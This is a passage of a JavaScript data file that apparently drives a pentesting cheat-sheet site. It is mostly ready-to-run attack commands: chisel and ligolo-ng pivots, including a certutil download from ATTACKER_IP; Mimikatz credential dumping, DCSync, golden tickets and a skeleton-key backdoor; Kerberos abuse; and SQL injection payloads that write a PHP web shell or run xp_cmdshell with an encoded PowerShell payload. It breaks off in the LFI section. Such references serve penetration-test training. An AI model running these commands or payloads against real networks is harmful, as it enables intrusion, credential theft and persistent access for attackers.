        code: "# Transfer chisel.exe to victim (certutil, PowerShell, etc.)\ncertutil -urlcache -f http://ATTACKER_IP/chisel.exe C:\\Windows\\Temp\\chisel.exe\n\n# Run on victim\nC:\\Windows\\Temp\\chisel.exe client ATTACKER_IP:8000 R:socks"
      },

      /* ── Ligolo-ng ── */
      {
        heading: "Ligolo-ng",
        level: 2,
        content: "High-performance TUN-based pivoting. Creates a virtual network interface for clean IP-level routing. No SOCKS/proxychains needed — tools work natively."
      },
      {
        heading: "Basic Setup",
        level: 3,
        code: "# Attacker: create TUN interface and start proxy\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# Victim: run agent\n./agent -connect ATTACKER_IP:11601 -ignore-cert"
      },
      {
        heading: "Route Internal Subnets",
        level: 3,
        content: "Once agent connects, select it in the ligolo console and add routes.",
        code: "# In ligolo proxy console:\n» session              # select the agent session\n» ifconfig             # view victim's network interfaces\n» start                # start the tunnel\n\n# On attacker (separate terminal), add route:\nsudo ip route add 10.10.20.0/24 dev ligolo\n\n# Now access internal hosts DIRECTLY (no proxychains):\nnmap -sT -Pn 10.10.20.10\nevil-winrm -i 10.10.20.15 -u admin -p pass\ncurl http://10.10.20.50"
      },
      {
        heading: "Listeners (Reverse Shells Through Tunnel)",
        level: 3,
        content: "Create listeners on the agent side so internal hosts can connect back to you through the tunnel.",
        code: "# In ligolo console — add a listener\n» listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp\n\n# This makes the victim listen on 4444 and forward to your local 4444\n# Set up your listener locally:\nnc -lvnp 4444\n\n# Trigger reverse shell on internal host pointing to victim's IP:4444\n# The shell arrives at your local nc listener"
      },
      {
        heading: "Double Pivot (Multi-Hop)",
        level: 3,
        content: "Chain through multiple networks by running agent on a second-hop victim.",
        code: "# After setting up first tunnel to 10.10.20.0/24:\n# 1. Transfer agent to second-hop host (10.10.20.50)\n# 2. Create listener on first agent for ligolo port:\n»  listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp\n# 3. Run agent on second-hop host:\n./agent -connect 10.10.20.1:11601 -ignore-cert\n# 4. Create second TUN interface and route:\nsudo ip tuntap add user $(whoami) mode tun ligolo2\nsudo ip link set ligolo2 up\n# 5. Select new session, start tunnel, add route:\nsudo ip route add 172.16.0.0/24 dev ligolo2"
      },
      {
        heading: "Cleanup",
        level: 3,
        code: "# Remove routes and interfaces after engagement\nsudo ip route del 10.10.20.0/24 dev ligolo\nsudo ip link set ligolo down\nsudo ip tuntap del mode tun ligolo"
      },

      /* ── Other Pivoting Tools ── */
      {
        heading: "socat",
        level: 2,
        content: "Simple TCP/UDP relay tool. Great for quick port forwards and ad-hoc relays.",
        code: "# Forward local port 8443 to internal 10.10.10.20:443\nsocat TCP-LISTEN:8443,fork TCP:10.10.10.20:443\n\n# Reverse relay: victim connects back to attacker\n# Attacker\nsocat TCP-LISTEN:9001,fork -\n# Victim\nsocat TCP:ATTACKER_IP:9001 TCP:127.0.0.1:3306\n\n# Encrypted relay with OpenSSL\nsocat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:10.10.10.20:80"
      },
      {
        heading: "sshuttle",
        level: 2,
        content: "User-space VPN-style pivot over SSH. No SOCKS needed — transparent subnet routing.",
        code: "# Route 10.10.0.0/16 through SSH host\nsshuttle -r user@jump-host 10.10.0.0/16\n\n# Include DNS through tunnel\nsshuttle --dns -r user@jump-host 10.10.0.0/16\n\n# Exclude specific subnets\nsshuttle -r user@jump-host 10.10.0.0/16 -x 10.10.1.0/24\n\n# Use with SSH key\nsshuttle -r user@jump-host --ssh-cmd 'ssh -i /path/to/key' 10.10.0.0/16"
      },
      {
        heading: "plink.exe (Windows SSH)",
        level: 2,
        content: "PuTTY command-line SSH client for Windows pivoting when native SSH is unavailable.",
        code: "# Local port forward from Windows victim\nplink.exe -ssh -l user -pw password -L 3389:10.10.20.15:3389 jump-host\n\n# Dynamic SOCKS from Windows\nplink.exe -ssh -l user -pw password -D 1080 jump-host\n\n# Remote port forward\nplink.exe -ssh -l user -pw password -R 8080:127.0.0.1:80 ATTACKER_IP"
      },
      {
        heading: "netsh (Windows Built-in)",
        level: 2,
        content: "Windows native port forwarding — no tools to upload, but requires admin privileges.",
        code: "# Add port forward: listen on 8080, forward to internal 10.10.20.15:80\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.20.15\n\n# List all forwards\nnetsh interface portproxy show all\n\n# Remove forward\nnetsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0\n\n# Open firewall for the listening port\nnetsh advfirewall firewall add rule name=\"pivot\" dir=in action=allow protocol=tcp localport=8080"
      },
      {
        heading: "Operational Notes",
        level: 2,
        list: [
          "Start with the least noisy tunnel that satisfies the objective",
          "Document which host/credential each tunnel depends on — tunnels break when shells die",
          "Kill stale forwards after use to reduce detection surface",
          "Prefer encrypted channels (SSH/chisel TLS/ligolo) when possible",
          "Test connectivity through the tunnel before running heavy scans",
          "For double pivots: ligolo-ng is king — SOCKS-over-SOCKS is painful",
          "Always have a fallback tunnel method in case the primary is detected/killed"
        ]
      }
    ]
  },

  /* ═══════════════════════════════════════════════════════════════
     Pentesting Tools Reference
     ═══════════════════════════════════════════════════════════════ */
  {
    id: "pentest_tools",
    title: "Pentesting Tools Reference",
    category: "Tools",
    icon: "🔧",
    sections: [

      /* ── Rubeus ── */
      {
        heading: "Rubeus",
        level: 2,
        content: "Windows Kerberos interaction and abuse toolkit. Commonly used for Kerberoasting, AS-REP roasting, ticket manipulation, and delegation attacks."
      },
      {
        heading: "Installation (Linux Cross-Compile)",
        level: 3,
        code: "sudo apt install mono-complete mono-xbuild ca-certificates-mono\n\n# Get nuget.exe\nwget https://dist.nuget.org/win-x86-commandline/latest/nuget.exe"
      },
      {
        heading: "Kerberoasting (using TGT)",
        level: 3,
        code: ".\\Rubeus.exe kerberoast /nowrap"
      },

      /* ── Invoke-RunasCs.ps1 ── */
      {
        heading: "Invoke-RunasCs.ps1",
        level: 2,
        content: "PowerShell script to execute commands as another user. Useful for lateral movement when you have credentials but need to run processes in a different user context."
      },
      {
        heading: "Remote Command Execution",
        level: 3,
        code: "Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.197:443"
      },

      /* ── Rdesktop ── */
      {
        heading: "Rdesktop",
        level: 2,
        content: "Linux-native RDP client for connecting to Windows hosts.",
        code: "# Basic connection\nrdesktop <DOMAIN.LOCAL>\nrdesktop <TARGET-IP>\n\n# Advanced — clipboard passthrough\nrdesktop -5 -K -r clipboard:CLIPBOARD <TARGET>"
      },

      /* ── Kerbrute ── */
      {
        heading: "Kerbrute",
        level: 2,
        content: "Fast Kerberos pre-authentication brute-forcer. Useful for user enumeration and password spraying against Active Directory."
      },
      {
        heading: "User Enumeration",
        level: 3,
        code: "./kerbrute userenum -d <domain> --dc <dc_ip> users.txt"
      },
      {
        heading: "Password Spray",
        level: 3,
        code: "./kerbrute passwordspray -d <domain> <users_file> <password> --dc <dc_ip>"
      },

      /* ── GenericAll ── */
      {
        heading: "GenericAll — Force Password Change",
        level: 2,
        content: "When you have GenericAll over a user, you can force-change their password without knowing the current one."
      },
      {
        heading: "Cleartext Credentials",
        level: 3,
        code: "net rpc password \"<target_user>\" \"<new_pass>\" -U <domain>/<your_user>%<your_pass> -S <dc_ip>"
      },
      {
        heading: "Pass-the-Hash Variant",
        level: 3,
        code: "pth-net rpc password \"<target_user>\" \"<new_pass>\" -U <domain>/<your_user>%<LMHASH>:<NTHASH> -S <dc_ip>"
      },

      /* ── SeMachineAccount / NoPac ── */
      {
        heading: "SeMachineAccount / NoPac",
        level: 2,
        content: "Exploits CVE-2021-42278 & CVE-2021-42287 to impersonate Domain Admin via machine account name spoofing. Requires SeMachineAccountPrivilege (default for authenticated users).",
        code: "python3 noPac.py <domain>/<user>:'<password>' -dc-ip <dc_ip> -shell --impersonate administrator -use-ldap"
      },

      /* ── Adalanche ── */
      {
        heading: "Adalanche",
        level: 2,
        content: "Active Directory ACL analysis and visualization tool. Alternative to BloodHound for graphing attack paths."
      },
      {
        heading: "Collector",
        level: 3,
        code: "./adalanche collect activedirectory --domain <domain> --username <user> --password <pass> --server <dc_ip>"
      },
      {
        heading: "Analyze",
        level: 3,
        content: "Starts a local web server for interactive AD graph visualization.",
        code: "./adalanche analyze"
      },

      /* ── PyWhisker ── */
      {
        heading: "PyWhisker",
        level: 2,
        content: "Python tool for manipulating msDS-KeyCredentialLink attribute (Shadow Credentials attack). Allows adding, removing, and listing Key Credential entries for target accounts."
      },
      {
        heading: "Key Actions",
        level: 3,
        code: "# List existing key credentials\npython3 pywhisker.py -d <domain> -u <user> -p <pass> --target <target_sam> -a list\n\n# Add a new key credential (Shadow Credentials attack)\npython3 pywhisker.py -d <domain> -u <user> -p <pass> --target <target_sam> -a add\n\n# Remove a specific key credential\npython3 pywhisker.py -d <domain> -u <user> -p <pass> --target <target_sam> -a remove -D <device_id>\n\n# Clear all key credentials\npython3 pywhisker.py -d <domain> -u <user> -p <pass> --target <target_sam> -a clear",
        list: [
          "Supported actions: list, add, spray, remove, clear, info, export, import",
          "Auth methods: password, NTLM hash (-H), Kerberos (-k), or certificate (--certfile/--keyfile)",
          "Use --use-ldaps for LDAPS connections",
          "After adding, use gettgtpkinit.py or certipy to obtain a TGT from the generated certificate"
        ]
      },

      /* ── PwnTools ── */
      {
        heading: "PwnTools",
        level: 2,
        content: "Python exploitation framework for CTFs and binary exploitation. Install: pip install pwntools"
      },
      {
        heading: "Basic Usage",
        level: 3,
        code: "from pwn import *\n\n# Connect to a remote service\nio = remote('example.com', 1337)\n# Send data\nio.sendline(b'Hello, server!')\n# Receive data\nresponse = io.recvline()\nprint(response.decode())\n# Close the connection\nio.close()"
      },
      {
        heading: "Extended Usage",
        level: 3,
        code: "from pwn import *\n\n# context settings (optional but useful)\ncontext.binary = './vulnerable_binary'\ncontext.terminal = ['tmux', 'splitw', '-h']  # for gdb debugging\n\n# Start the process or connect remotely\np = process('./vulnerable_binary')\n# p = remote('host', 1337)\n\n# Interact with the binary\np.sendlineafter('>', '1')       # wait for '>' prompt, send '1'\np.recvuntil('Your input:')      # read until this string\np.sendline('A' * 64)            # send payload\n\n# Optional: interactive shell\np.interactive()"
      },
      {
        heading: "Quick Reference",
        level: 3,
        list: [
          "process(path) — Run a local binary",
          "remote(host, port) — Connect to a remote service",
          "sendline(data) — Send a line (auto newline)",
          "recvline() — Receive a line",
          "sendafter(delim, data) — Wait for delim, then send",
          "recvuntil(delim) — Read until you see delim",
          "interactive() — Drop into an interactive shell",
          "p64() / u64() — Pack/unpack 64-bit values"
        ]
      }
    ]
  },

  /* ═══════════════════════════════════════════════════════════════
     Compiling C/C++ for Exploits
     ═══════════════════════════════════════════════════════════════ */
  {
    id: "compiling_exploits",
    title: "Compiling C/C++ for Exploits",
    category: "Payload Development",
    icon: "⚙️",
    sections: [
      {
        heading: "Overview",
        level: 2,
        content: "Cross-compile C/C++ exploit code from Linux (Kali) to Windows executables using MinGW. Essential when public exploits are provided as source code targeting Windows."
      },

      /* ── 64-bit ── */
      {
        heading: "64-bit Windows Binaries",
        level: 2
      },
      {
        heading: "C",
        level: 3,
        code: "x86_64-w64-mingw32-gcc program.c -o program.exe"
      },
      {
        heading: "C++",
        level: 3,
        code: "x86_64-w64-mingw32-g++ program.cpp -o program.exe"
      },

      /* ── 32-bit ── */
      {
        heading: "32-bit Windows Binaries",
        level: 2,
        code: "i686-w64-mingw32-gcc program.c -o program.exe"
      },

      /* ── Linker Flags ── */
      {
        heading: "Linker Flags",
        level: 2,
        content: "If your code includes winsock2.h and windows.h, add the following linker flags:",
        code: "-lws2_32 -luser32 -static-libgcc -static-libstdc++"
      },
      {
        heading: "Full Example (64-bit with Winsock2)",
        level: 3,
        code: "x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 -luser32 -static-libgcc -static-libstdc++"
      },

      /* ── Quick Reference ── */
      {
        heading: "Quick Reference",
        level: 2,
        list: [
          "64-bit C: x86_64-w64-mingw32-gcc",
          "64-bit C++: x86_64-w64-mingw32-g++",
          "32-bit C: i686-w64-mingw32-gcc",
          "32-bit C++: i686-w64-mingw32-g++",
          "-lws2_32 — link Winsock2 (networking exploits)",
          "-luser32 — link Windows user32 API",
          "-static-libgcc -static-libstdc++ — static link to avoid DLL dependencies on target"
        ]
      }
    ]
  },

  /* ═══════════════════════════════════════════════════════════════
     Reference Links & Cheat Sheets
     ═══════════════════════════════════════════════════════════════ */
  {
    id: "reference_links",
    title: "Reference Links & Cheat Sheets",
    category: "Reference",
    icon: "🔗",
    sections: [
      {
        heading: "Linux Privilege Escalation",
        level: 2,
        list: [
          "GTFOBins — Unix binaries for privilege escalation, file transfer, reverse shells: https://gtfobins.github.io/",
          "LinPEAS — Linux Privilege Escalation Awesome Script (PEASS-ng): https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS",
          "linux-exploit-suggester — Kernel exploit finder: https://github.com/The-Z-Labs/linux-exploit-suggester",
          "pspy — Unprivileged Linux process snooping: https://github.com/DominicBreuker/pspy"
        ]
      },
      {
        heading: "Windows Privilege Escalation",
        level: 2,
        list: [
          "LOLBAS — Living Off The Land Binaries, Scripts and Libraries: https://lolbas-project.github.io/",
          "WinPEAS — Windows Privilege Escalation Awesome Script: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS",
          "PowerSploit / PowerView — PowerShell post-exploitation: https://github.com/PowerShellMafia/PowerSploit",
          "Seatbelt — GhostPack host survey: https://github.com/GhostPack/Seatbelt",
          "SharpUp — GhostPack privilege escalation checks: https://github.com/GhostPack/SharpUp",
          "PrivescCheck — PowerShell privesc checker: https://github.com/itm4n/PrivescCheck",
          "Potato family — SeImpersonatePrivilege exploits: GodPotato, SweetPotato, JuicyPotato, PrintSpoofer, RoguePotato"
        ]
      },
      {
        heading: "Active Directory",
        level: 2,
        list: [
          "WADComs — Windows/AD interactive cheat sheet: https://wadcoms.github.io/",
          "The Hacker Recipes — AD attack encyclopedia: https://www.thehacker.recipes/",
          "ired.team — Red Team notes (AD, credentials, persistence): https://www.ired.team/",
          "BloodHound CE — AD attack path mapping: https://github.com/SpecterOps/BloodHound",
          "Impacket — Python network protocol toolkit: https://github.com/fortra/impacket",
          "Rubeus — Kerberos abuse toolkit: https://github.com/GhostPack/Rubeus",
          "Certipy — ADCS exploitation: https://github.com/ly4k/Certipy",
          "NetExec (nxc) — Swiss army knife for AD: https://github.com/Pennyw0rth/NetExec",
          "Responder — LLMNR/NBT-NS/mDNS poisoner: https://github.com/lgandx/Responder"
        ]
      },
      {
        heading: "Web Application",
        level: 2,
        list: [
          "HackTricks — Comprehensive hacking wiki: https://book.hacktricks.wiki/",
          "PayloadsAllTheThings — Payload lists for web attacks: https://github.com/swisskyrepo/PayloadsAllTheThings",
          "SecLists — Fuzzing wordlists, payloads, usernames: https://github.com/danielmiessler/SecLists",
          "RevShells — Reverse shell generator: https://www.revshells.com/",
          "CyberChef — Data encoding/decoding Swiss army knife: https://gchq.github.io/CyberChef/",
          "Burp Suite — Web proxy and scanner: https://portswigger.net/burp",
          "PortSwigger Web Security Academy — Free web security training: https://portswigger.net/web-security"
        ]
      },
      {
        heading: "Exploit Databases & CVEs",
        level: 2,
        list: [
          "ExploitDB / searchsploit — Public exploit archive: https://www.exploit-db.com/",
          "NVD — NIST National Vulnerability Database: https://nvd.nist.gov/",
          "GitHub Advisory Database: https://github.com/advisories",
          "Packet Storm Security: https://packetstormsecurity.com/"
        ]
      },
      {
        heading: "Credential Attacks",
        level: 2,
        list: [
          "Hashcat — GPU-accelerated hash cracking: https://hashcat.net/hashcat/",
          "Hashcat example hashes (mode reference): https://hashcat.net/wiki/doku.php?id=example_hashes",
          "CrackStation — Free online hash lookup: https://crackstation.net/",
          "LaZagne — Credential harvesting from browsers/mail/etc: https://github.com/AlessandroZ/LaZagne",
          "Mimikatz — Windows credential extraction: https://github.com/gentilkiwi/mimikatz"
        ]
      },
      {
        heading: "General Methodology",
        level: 2,
        list: [
          "OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/",
          "PTES — Penetration Testing Execution Standard: http://www.pentest-standard.org/",
          "MITRE ATT&CK — Adversary TTP framework: https://attack.mitre.org/",
          "Hack The Box — Practice platform: https://app.hackthebox.com/",
          "Offensive Security Proving Grounds: https://www.offsec.com/labs/"
        ]
      }
    ]
  },

  /* ═══════════════════════════════════════════════════════════════
     Mimikatz Reference
     ═══════════════════════════════════════════════════════════════ */
  {
    id: "mimikatz_reference",
    title: "Mimikatz Reference",
    category: "Active Directory",
    icon: "🐱",
    sections: [
      {
        heading: "Overview",
        level: 2,
        content: "Mimikatz extracts credentials, hashes, and Kerberos tickets from Windows memory. Requires local admin or SYSTEM privileges. Always run privilege::debug first."
      },
      {
        heading: "Initial Setup",
        level: 2,
        code: "# Enable debug privilege (required)\nprivilege::debug\n\n# Elevate to SYSTEM token\ntoken::elevate"
      },

      /* ── Credential Extraction ── */
      {
        heading: "Credential Extraction",
        level: 2
      },
      {
        heading: "LSASS Dump (Plaintext / NTLM)",
        level: 3,
        code: "# Dump logon passwords from LSASS\nsekurlsa::logonpasswords\n\n# WDigest plaintext (if enabled)\nsekurlsa::wdigest\n\n# Kerberos tickets from memory\nsekurlsa::tickets /export"
      },
      {
        heading: "SAM Database",
        level: 3,
        code: "# Dump local SAM hashes\nlsadump::sam\n\n# From offline registry hives\nlsadump::sam /system:SYSTEM /sam:SAM"
      },
      {
        heading: "LSA Secrets / DPAPI",
        level: 3,
        code: "# Dump LSA secrets (service account passwords, DPAPI keys)\nlsadump::secrets\n\n# Dump cached domain credentials\nlsadump::cache"
      },

      /* ── DCSync ── */
      {
        heading: "DCSync Attack",
        level: 2,
        content: "Replicates credentials from a DC. Requires Replicating Directory Changes + Replicating Directory Changes All privileges.",
        code: "# DCSync specific user\nlsadump::dcsync /user:DOMAIN\\Administrator\n\n# DCSync krbtgt (for Golden Ticket)\nlsadump::dcsync /user:DOMAIN\\krbtgt\n\n# DCSync all accounts\nlsadump::dcsync /all /csv"
      },

      /* ── Kerberos Attacks ── */
      {
        heading: "Kerberos Ticket Attacks",
        level: 2
      },
      {
        heading: "Golden Ticket",
        level: 3,
        content: "Forges a TGT using the krbtgt NTLM hash. Grants domain-wide access.",
        code: "kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /krbtgt:<NTLM_HASH> /ptt\n\n# With specific RID for DA\nkerberos::golden /user:fakeadmin /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /krbtgt:<HASH> /id:500 /ptt"
      },
      {
        heading: "Silver Ticket",
        level: 3,
        content: "Forges a TGS for a specific service using the service account NTLM hash.",
        code: "# CIFS (file shares)\nkerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /target:DC01.DOMAIN.LOCAL /service:cifs /rc4:<SVC_NTLM> /ptt\n\n# MSSQL\nkerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /target:SQL01.DOMAIN.LOCAL /service:MSSQLSvc /rc4:<SVC_NTLM> /ptt"
      },
      {
        heading: "Pass-the-Ticket",
        level: 3,
        code: "# List current tickets\nkerberos::list\n\n# Pass a .kirbi ticket\nkerberos::ptt ticket.kirbi\n\n# Purge all tickets\nkerberos::purge"
      },

      /* ── Pass-the-Hash ── */
      {
        heading: "Pass-the-Hash",
        level: 2,
        code: "# Spawn cmd.exe as another user using NTLM hash\nsekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:<NTLM_HASH>\n\n# Over-pass-the-hash (request TGT with hash)\nsekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:<HASH> /run:powershell.exe"
      },

      /* ── Persistence ── */
      {
        heading: "Persistence Mechanisms",
        level: 2
      },
      {
        heading: "Skeleton Key",
        level: 3,
        content: "Patches LSASS on a DC to accept a master password alongside normal passwords.",
        code: "# Inject skeleton key (default password: mimikatz)\nmisc::skeleton\n\n# Now authenticate to any domain account with 'mimikatz' as password"
      },
      {
        heading: "DSRM Admin",
        level: 3,
        content: "Enables network logon with the DSRM (Directory Services Restore Mode) admin hash.",
        code: "# Get DSRM admin hash\nlsadump::lsa /patch\n\n# Enable DSRM network logon (run on DC)\nNew-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD"
      },
      {
        heading: "Custom SSP",
        level: 3,
        content: "Injects a Security Support Provider to log plaintext credentials on every logon.",
        code: "# Inject mimilib SSP in memory (non-persistent)\nmisc::memssp\n\n# Credentials logged to C:\\Windows\\System32\\mimilsa.log"
      },

      /* ── Quick Reference ── */
      {
        heading: "Quick Reference",
        level: 2,
        list: [
          "privilege::debug — Required first step, enable SeDebugPrivilege",
          "token::elevate — Impersonate SYSTEM token",
          "sekurlsa::logonpasswords — Dump all logon credentials from LSASS",
          "sekurlsa::pth — Pass-the-hash / over-pass-the-hash",
          "lsadump::dcsync — Replicate credentials from DC",
          "lsadump::sam — Dump local SAM database",
          "lsadump::secrets — Dump LSA secrets",
          "lsadump::cache — Dump cached domain creds",
          "kerberos::golden — Forge Golden/Silver tickets",
          "kerberos::ptt — Pass-the-ticket",
          "kerberos::list — List cached tickets",
          "misc::skeleton — Inject skeleton key on DC",
          "misc::memssp — Inject credential-logging SSP"
        ]
      }
    ]
  },

  {
    id: "sql_injection",
    title: "SQL Injection",
    category: "Web Exploitation",
    icon: "💉",
    sections: [
      {
        heading: "Overview",
        level: 2,
        content: "SQL Injection (SQLi) occurs when user-supplied input is inserted into a SQL query without proper sanitization. It allows an attacker to read, modify, or delete database contents, bypass authentication, and in some cases execute OS commands or read/write files on the server.\n\nSQLi is one of the most critical web vulnerabilities and a core OSCP exam skill. It appears in login forms, search fields, URL parameters, cookies, HTTP headers — anywhere user input reaches a SQL query."
      },
      {
        heading: "Types of SQL Injection",
        level: 2,
        list: [
          "In-Band (Classic) — Results are returned directly in the HTTP response. Includes UNION-based (extract data via UNION SELECT) and Error-based (extract data from verbose DB error messages).",
          "Blind SQLi — No visible output in the response. Boolean-based: infer data by observing true/false response differences. Time-based: infer data by triggering conditional time delays (e.g., SLEEP()).",
          "Out-of-Band — Data is exfiltrated via a separate channel (DNS lookup, HTTP request to attacker server). Used when in-band and blind are not possible."
        ]
      },
      {
        heading: "Detection & Identification",
        level: 2,
        content: "Test every input field (GET/POST params, cookies, headers) with these probes. A SQL error or behavioral change confirms injection.",
        code: "# String-based test payloads\n'           # Single quote — most common trigger\n''          # Double single quote\n\"           # Double quote\n' OR '1'='1 # Always-true condition (auth bypass)\n' OR '1'='2 # Always-false condition (compare response)\n' AND 1=1-- # True condition with comment\n' AND 1=2-- # False condition with comment\n\n# Numeric test payloads\n1 OR 1=1\n1 AND 1=2\n1; SELECT 1--\n\n# Time-based blind detection\n' OR SLEEP(5)--                     # MySQL\n'; WAITFOR DELAY '0:0:5'--          # MSSQL\n' OR pg_sleep(5)--                  # PostgreSQL\n\n# Common comment terminators\n--        # MySQL, MSSQL, PostgreSQL\n-- -      # MySQL (space after --)\n#         # MySQL\n/**/      # Inline comment (all DBs)"
      },
      {
        heading: "UNION-Based Injection",
        level: 2,
        content: "UNION SQLi lets you append your own SELECT statement to the original query. You must first determine the number of columns in the original query, then align your UNION SELECT to match.\n\nMethodology: find column count → find displayable columns → extract data.",
        code: "# Step 1: Find number of columns (increment until no error)\n' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--   # Error here means 2 columns\n\n# Alternative: NULL-based column counting\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\n\n# Step 2: Find which columns are displayed\n' UNION SELECT 'aaa',NULL,NULL--\n' UNION SELECT NULL,'bbb',NULL--\n\n# Step 3: Extract database version\n' UNION SELECT NULL,version(),NULL--          # MySQL/PostgreSQL\n' UNION SELECT NULL,@@version,NULL--          # MSSQL\n\n# Step 4: Enumerate databases\n' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--\n\n# Step 5: Enumerate tables\n' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--\n\n# Step 6: Enumerate columns\n' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--\n\n# Step 7: Extract data\n' UNION SELECT NULL,concat(username,':',password),NULL FROM users--"
      },
      {
        heading: "Authentication Bypass",
        level: 2,
        content: "Login forms that build queries like SELECT * FROM users WHERE username='X' AND password='Y' are vulnerable to simple bypass payloads.",
        code: "# Classic auth bypass payloads (enter in username field)\nadmin' OR '1'='1'--\nadmin'--\n' OR 1=1--\n' OR 1=1#\n' OR '1'='1'/*\nadmin' OR 1=1-- -\n\n# If both username and password are injectable\nUsername: admin'--\nPassword: anything\n\n# Numeric ID bypass\n1 OR 1=1--"
      },
      {
        heading: "Blind SQLi Techniques",
        level: 2,
        content: "When the application does not display query results or error messages, use boolean or time-based inference to extract data one character at a time.",
        code: "# Boolean-based: extract database version char by char\n' AND SUBSTRING(version(),1,1)='5'--\n' AND SUBSTRING(version(),1,1)='8'--\n\n# Boolean-based: extract password from users table\n' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--\n' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--\n\n# Time-based: confirm injection\n' AND IF(1=1, SLEEP(3), 0)--            # MySQL\n' AND IF(1=2, SLEEP(3), 0)--            # Should NOT sleep\n\n# Time-based: extract data\n' AND IF(SUBSTRING(version(),1,1)='5', SLEEP(3), 0)--\n\n# MSSQL time-based\n'; IF (1=1) WAITFOR DELAY '0:0:3'--\n'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:3'--"
      },
      {
        heading: "Database-Specific Techniques",
        level: 2,
        content: "Each DBMS has unique syntax for file read/write and command execution.",
        code: "# ── MySQL ──\n# Read files\n' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--\n\n# Write web shell (requires FILE privilege + writable dir)\n' UNION SELECT NULL,'<?php system($_GET[\"cmd\"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--\n\n# ── PostgreSQL ──\n# Read files (superuser)\n' UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL--\n\n# Command execution\n'; COPY (SELECT '') TO PROGRAM 'id'--\n\n# ── MSSQL ──\n# Enable xp_cmdshell\n'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--\n'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--\n\n# Execute OS commands\n'; EXEC xp_cmdshell 'whoami';--\n'; EXEC xp_cmdshell 'powershell -e ENCODED_PAYLOAD';--"
      },
      {
        heading: "sqlmap Automation",
        level: 2,
        content: "sqlmap automates SQLi detection and exploitation. Use it after confirming injection manually. Save Burp requests to a file for the most reliable targeting.",
        code: "# Basic scan on a URL parameter\nsqlmap -u 'http://TARGET/page?id=1' --batch\n\n# From a saved Burp request file\nsqlmap -r request.txt --batch\n\n# Specify POST parameter\nsqlmap -u 'http://TARGET/login' --data 'user=admin&pass=test' -p user --batch\n\n# Enumerate databases\nsqlmap -r request.txt --dbs --batch\n\n# Enumerate tables in a database\nsqlmap -r request.txt -D target_db --tables --batch\n\n# Dump specific table\nsqlmap -r request.txt -D target_db -T users --dump --batch\n\n# OS shell (if privileges allow)\nsqlmap -r request.txt --os-shell --batch\n\n# Useful flags\n--level=5 --risk=3      # Maximum testing depth\n--threads=10            # Speed up\n--tamper=space2comment  # Bypass WAF\n--technique=BEUSTQ      # Specify techniques (Boolean/Error/Union/Stacked/Time/Query)"
      },
      {
        heading: "SQLi Methodology Workflow",
        level: 2,
        numbered: true,
        list: [
          "Identify all input vectors (URL params, POST data, cookies, headers)",
          "Test with single quote (') and observe response (error? behavioral change?)",
          "Determine injection type: error-based, UNION, blind boolean, blind time-based",
          "Identify the DBMS from error messages or version queries",
          "For UNION: find column count (ORDER BY), find displayable columns",
          "Extract schema → tables → columns → data",
          "Check for file read/write privileges (LOAD_FILE, INTO OUTFILE, pg_read_file)",
          "Check for command execution (xp_cmdshell, COPY TO PROGRAM)",
          "If manual is slow, confirm with sqlmap using saved request file",
          "Document: injection point, payload, extracted data, any shell obtained"
        ]
      }
    ]
  },

  {
    id: "lfi_rfi_path_traversal",
    title: "LFI / RFI / Path Traversal",
    category: "Web Exploitation",
    icon: "📂",
    sections: [
      {
        heading: "Overview",
        level: 2,
        content: "Local File Inclusion (LFI) and Path Traversal allow an attacker to read files from the server by manipulating file path parameters. Remote File Inclusion (RFI) allows including a file from an external server, often leading to code execution.\n\nThese vulnerabilities appear whenever an application uses user input to construct a file path — e.g., page=about.php, template=header, lang=en. LFI is extremely common in OSCP exam machines."
      },
      {
        heading: "Path Traversal / LFI Detection",
        level: 2,
        content: "Test any parameter that references a filename or path. The goal is to escape the intended directory and read sensitive files.",
